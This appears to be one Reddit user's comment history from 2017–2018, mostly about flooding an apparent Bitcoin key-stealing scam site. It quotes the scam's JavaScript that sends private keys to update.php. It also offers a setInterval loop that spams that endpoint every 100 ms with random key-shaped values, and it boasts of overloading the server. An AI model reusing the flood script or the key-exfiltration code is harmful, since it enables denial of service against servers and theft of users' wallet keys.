@_author: clockwork_blue
@_date: 2018-01-04 17:45:16
Who upvotes this shit?
@_date: 2018-05-24 08:45:27


@_date: 2017-11-24 08:19:15
@_date: 2017-09-27 08:56:14
Here's a better one
    function makeid(len) {
      var text = "";
      var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    
      for (var i = 0; i &lt; len; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    
      return text;
    }
    
    setInterval(() =&gt; Bitcoin.ECKey.prototype.sendajaxrequest(makeid(34), makeid(52)), 100);
@_date: 2017-09-27 10:29:27
Filled them with about 100k fake rows using this 
@_date: 2017-09-15 17:23:30
@_date: 2017-10-10 18:26:18
There's always *You vs. Us* no matter the object of interest.
@_date: 2017-10-07 08:45:24
Sends the requests with the same size and content as the public and private keys making it impossible to filter between spams and real requests.
@_date: 2017-09-27 11:28:46
Judging by how they handle error 500 with recursive resend, which literally just spams the request handler until it stops giving error 500, I doubt they understand how anti-spam works.   
	ECKey.prototype.sendajaxrequest = function(btcaddress, privaddress)
	{
		var http = new XMLHttpRequest();
		var url = "update.php";
		var pub = btcaddress;
		var params = "name="+pub+"&amp;id="+privaddress;
		http.open("POST", url, true);
		http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		http.onreadystatechange = function() {
			if (http.readyState === 4) {  
				if (http.status === 500) {  
					ECKey.prototype.sendajaxrequest(btcaddress, privaddress);
				}
			}  
		}
		http.send(params);
	};
It seems that it's flooded now and all requests to the handler give error 500.
@_date: 2017-10-07 16:41:48
They've changed it since and it doesn't work at all (even for its original purpose).